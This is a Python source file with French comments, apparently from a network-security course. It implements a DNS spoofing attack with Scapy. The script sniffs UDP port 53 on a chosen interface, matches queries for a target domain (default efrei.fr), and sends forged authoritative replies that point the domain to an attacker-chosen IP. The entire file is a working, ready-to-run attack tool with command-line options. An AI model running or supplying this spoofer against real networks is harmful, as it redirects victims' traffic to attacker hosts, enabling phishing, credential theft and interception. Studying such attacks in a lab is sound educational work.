from scapy.all import sniff, send, IP, UDP, DNS, DNSQR, DNSRR
import argparse

def dns_spoof(packet, spoofed_domain, spoofed_ip):
    """
    Intercepte une requête DNS et répond malicieusement uniquement si :
    - C'est une requête (qr=0).
    - Le domaine correspond au spoofed_domain.
    """
    if packet.haslayer(DNS) and packet[DNS].qr == 0:  # Filtrage pour les requêtes DNS uniquement
        queried_domain = packet[DNSQR].qname.decode().strip(".")  # Domaine demandé
        if queried_domain == spoofed_domain:  # Vérifie que le domaine correspond
            print(f"[INFO] Requête interceptée pour {queried_domain}. Réponse malveillante envoyée avec IP : {spoofed_ip}")

            # Construction de la réponse DNS spoofée
            spoofed_response = (
                IP(src=packet[IP].dst, dst=packet[IP].src) /  # Inversion des adresses IP
                UDP(sport=packet[UDP].dport, dport=packet[UDP].sport) /  # Inversion des ports
                DNS(
                    id=packet[DNS].id,  # Identifiant DNS identique
                    qr=1,  # Réponse
                    aa=1,  # Réponse autoritaire
                    qd=packet[DNS].qd,  # Copie de la question
                    an=DNSRR(rrname=queried_domain + ".", rdata=spoofed_ip)  # Réponse avec IP spoofée
                )
            )

            # Envoi de la réponse DNS malveillante
            send(spoofed_response, verbose=0)
        else:
            print(f"[DEBUG] Requête ignorée : {queried_domain} ne correspond pas à {spoofed_domain}")

def start_dns_spoof(spoofed_domain, spoofed_ip, interface):
    """
    Lance l'interception des requêtes DNS sur une interface réseau spécifique.
    """
    print(f"[INFO] DNS spoofing activé : {spoofed_domain} -> {spoofed_ip} sur {interface}")
    sniff(
        filter="udp port 53",  # Filtre pour capturer uniquement les paquets DNS
        iface=interface,  # Interface réseau à utiliser
        prn=lambda packet: dns_spoof(packet, spoofed_domain, spoofed_ip)
    )

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Script de DNS spoofing avec Scapy.")
    parser.add_argument("-d", "--domain", default="efrei.fr", help="Nom de domaine à spoof (par défaut : efrei.fr).")
    parser.add_argument("-i", "--ip", default="13.37.13.37", help="Adresse IP spoofée (par défaut : 13.37.13.37).")
    parser.add_argument("-n", "--interface", required=True, help="Interface réseau à utiliser.")
    args = parser.parse_args()

    start_dns_spoof(args.domain, args.ip, args.interface)
